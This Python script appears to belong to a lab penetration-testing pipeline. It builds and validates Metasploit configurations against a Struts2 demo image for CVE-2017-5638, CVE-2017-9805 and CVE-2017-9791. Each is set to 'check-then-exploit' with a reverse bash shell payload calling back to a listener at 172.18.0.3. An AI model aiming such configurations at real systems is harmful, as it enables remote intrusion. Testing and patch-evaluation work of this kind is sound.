"""Build + dry-run validate the J1Thf Attack Form submission (S2-045/S2-048/S2-052)."""
import hashlib
import json
from pathlib import Path

import yaml

from kalama.execution.executor import build_execution_plan
from kalama.resolver.backend import resolver_backend
from kalama.resolution.config_codec import exploit_config_from_dict
from kalama.resolution.submission import apply_human_confirmation
from kalama.resolver.config import validate_exploit_config

root = Path.cwd()
run_id = "J1Thf"
out_root = root / "output" / "2d8ru-struts2-fullpipeline"
state_path = out_root / "state" / f"run_{run_id}.json"
state = json.loads(state_path.read_text(encoding="utf-8"))
form_path = Path(state["artifacts"]["ATTACK_FORM"]["path"])
resolver_path = Path(state["artifacts"]["RESOLVER_BEFORE"]["path"])
form = yaml.safe_load(form_path.read_text(encoding="utf-8"))
resolver = json.loads(resolver_path.read_text(encoding="utf-8"))
submission = json.loads(json.dumps(form))

LHOST = "172.18.0.3"
RPORT = 8080


def confirm_value(field, value=None):
    if value is None:
        value = field.get("suggested")
    field["confirmed"] = value
    return value


def confirm_option(opts, name, value=None):
    confirm_value(opts[name], value)


def apply_common(cve):
    env = cve["environment"]
    confirm_value(env["rport"], RPORT)
    if "lhost" in env:
        confirm_value(env["lhost"], LHOST)


def set_protocol(cve, mode):
    p = cve["execution_protocol"]
    p["mode"] = mode
    p["confirmed"] = True
    p["confirmation_status"] = "HUMAN_CONFIRMED"
    if mode == "check-then-exploit":
        p["run_check"] = True
        p["run_exploit"] = True
    elif mode == "exploit-only":
        p["run_check"] = False
        p["run_exploit"] = True
    p["session_confirmation_expected"] = bool(p["run_exploit"])


backend = resolver_backend()
_cache = {}


def introspect(module, payload):
    key = (module, payload)
    if key not in _cache:
        _cache[key] = backend.introspect_payload(module, payload, "msf-resolver-host")
    return _cache[key]


def set_payload(cve, module, payload_name, lport):
    expected = {"LHOST": LHOST, "LPORT": lport}
    try:
        live = introspect(module, payload_name)
        avail = {o.name for o in (live.options or [])}
        print(f"  payload schema for {payload_name}: {sorted(avail)}")
        names = [n for n in ["LHOST", "LPORT", "ReverseAllowProxy", "ReverseListenerThreaded",
                             "AutoVerifySession", "BashPath", "ShellPath"] if n in avail]
        std = {"ReverseAllowProxy": False, "ReverseListenerThreaded": False,
               "AutoVerifySession": True, "BashPath": "bash", "ShellPath": "sh"}
        opts = dict(expected)
        for n in names:
            if n in std:
                opts[n] = std[n]
    except Exception as exc:
        print(f"  introspection failed ({exc}); using LHOST/LPORT only")
        opts = dict(expected)
    confirm_value(cve["payload"], payload_name)
    cve["payload_options"] = {n: {"confirmed": v} for n, v in sorted(opts.items())}


INCLUDED = {}


def include(cve_id, target_idx, target_name, targeturi, module_opts, payload, lport):
    cve = submission["cves"][cve_id]
    module = cve["module"]["confirmed"] or cve["module"]["suggested"]
    apply_common(cve)
    confirm_value(cve["target"]["index"], target_idx)
    confirm_value(cve["target"]["name"], target_name)
    confirm_value(cve["targeturi"], targeturi)
    for name in module_opts:
        confirm_option(cve["module_options"], name)
    set_payload(cve, module, payload, lport)
    set_protocol(cve, "check-then-exploit")
    INCLUDED[cve_id] = True


include("CVE-2017-5638", 0, "Universal", "/S2-045/",
        ["DOMAIN", "HTTP::Auth", "HTTP::KrbOfferedEncryptionTypes", "HTTPMethod",
         "KrbCacheMode", "KrbClockSkew", "SSLVersion"],
        "cmd/unix/reverse_bash", 14711)

include("CVE-2017-9805", 0, "Unix (In-Memory)", "/S2-052/orders/3",
        ["DOMAIN", "HTTP::Auth", "HTTP::KrbOfferedEncryptionTypes", "HTTP::server_name",
         "KrbCacheMode", "KrbClockSkew",
         "Powershell::encode_final_payload", "Powershell::encode_inner_payload",
         "Powershell::exec_in_place", "Powershell::exec_rc4", "Powershell::method",
         "Powershell::no_equals", "Powershell::noninteractive", "Powershell::persist",
         "Powershell::prepend_protections_bypass", "Powershell::remove_comspec",
         "Powershell::strip_comments", "Powershell::strip_whitespace",
         "Powershell::sub_funcs", "Powershell::sub_vars", "Powershell::wrap_double_quotes",
         "SRVPORT", "SSLVersion"],
        "cmd/unix/reverse_bash", 14712)

include("CVE-2017-9791", 0, "Universal", "/S2-048/integration/saveGangster.action",
        ["DOMAIN", "HTTP::Auth", "HTTP::KrbOfferedEncryptionTypes",
         "KrbCacheMode", "KrbClockSkew", "POSTPARAM", "SSLVersion"],
        "cmd/unix/reverse_bash", 14713)

SKIP_REASONS = {
    "CVE-2021-44228": "False positive for this image: bundled log4j is 1.2.17, not log4j2-core; no JNDI/LDAP log4shell runtime vector in the Struts2/Tomcat demo apps.",
    "CVE-2021-45046": "False positive for this image: log4j 1.2.17 only, not log4j2-core; no log4shell runtime vector.",
    "CVE-2022-22965": "False positive: Spring Framework 5.x on JDK9+ vector; image ships Spring 3.0.5 libs with Struts2 demos, no Spring Boot runtime.",
    "CVE-2025-24813": "Tomcat partial-PUT deserialization vector not verified reachable on Tomcat 8.5.20 default config in this image; out of scope for the Struts demo pipeline.",
    "CVE-2021-39144": "VMware NSX Manager XStream vector; product-specific false positive for a Struts2 Tomcat image.",
    "CVE-2017-12617": "Tomcat JSP upload bypass via HTTP PUT; PUT write not verified on this image; out of scope for the Struts demo pipeline.",
    "CVE-2013-2251": "Additional Struts RCE outside the image-designated S2-045/S2-048/S2-052 demo paths; runtime reachability unverified; excluded to keep before/after attribution clean.",
    "CVE-2020-17530": "Additional Struts RCE outside the image-designated S2-045/S2-048/S2-052 demo paths; runtime reachability unverified; excluded to keep before/after attribution clean.",
    "CVE-2012-0391": "Additional Struts RCE outside the image-designated S2-045/S2-048/S2-052 demo paths; runtime reachability unverified; excluded to keep before/after attribution clean.",
    "CVE-2018-11776": "Additional Struts RCE outside the image-designated S2-045/S2-048/S2-052 demo paths; runtime reachability unverified; excluded to keep before/after attribution clean.",
    "CVE-2019-0230": "Additional Struts RCE outside the image-designated S2-045/S2-048/S2-052 demo paths; runtime reachability unverified; excluded to keep before/after attribution clean.",
    "CVE-2011-3923": "Additional Struts RCE outside the image-designated S2-045/S2-048/S2-052 demo paths; runtime reachability unverified; excluded to keep before/after attribution clean.",
    "CVE-2016-3087": "Additional Struts RCE outside the image-designated S2-045/S2-048/S2-052 demo paths; runtime reachability unverified; excluded to keep before/after attribution clean.",
}

for cve_id, cve in submission["cves"].items():
    if cve_id in INCLUDED:
        continue
    reason = SKIP_REASONS.get(cve_id)
    if reason is None:
        raise SystemExit(f"no skip reason defined for {cve_id}")
    cve["decision"] = {"confirmed": "skip", "reason": reason}

out_path = out_root / "resolver" / "forms" / f"attack_form_{run_id}_r1_submission.yaml"
out_path.write_text(yaml.safe_dump(submission, sort_keys=False, allow_unicode=True), encoding="utf-8")

loader = lambda module, payload: introspect(module, payload)  # noqa: E731

print("submission CVEs:", sorted(submission["cves"].keys()))
all_ready = True
for entry in resolver["cves"]:
    cve_id, rank = entry.get("cve_id"), int(entry.get("rank", 0))
    config_raw = entry.get("exploit_config")
    if config_raw is None:
        print(f"{cve_id}: no exploit_config (not editable: {entry.get('status')})")
        continue
    config = exploit_config_from_dict(config_raw)
    human = submission["cves"].get(cve_id)
    if human is None:
        v = validate_exploit_config(config)
        print(f"{cve_id}: NOT SUBMITTED, readiness={v.readiness.value}")
        continue
    applied = apply_human_confirmation(config, human, payload_introspector=loader)
    plan = build_execution_plan(applied.config, rank) if applied.validation.ready else None
    if cve_id in INCLUDED:
        all_ready = all_ready and applied.validation.ready
    print(f"{cve_id}: ready={applied.validation.ready} readiness={applied.validation.readiness.value} "
          f"issues={[i.to_dict() for i in applied.validation.issues]} "
          f"skipped={applied.skipped} reason={applied.skip_reason}")
    if plan is not None:
        print(f"  plan module={plan.module} targeturi={dict(plan.module_options).get('TARGETURI')} "
              f"payload={plan.payload} popts={dict(plan.payload_options)} "
              f"opts-RHOSTS/RPORT={dict(plan.module_options).get('RHOSTS')}/{dict(plan.module_options).get('RPORT')}")
print("ALL_INCLUDED_READY:", all_ready)
print("OUT:", out_path)
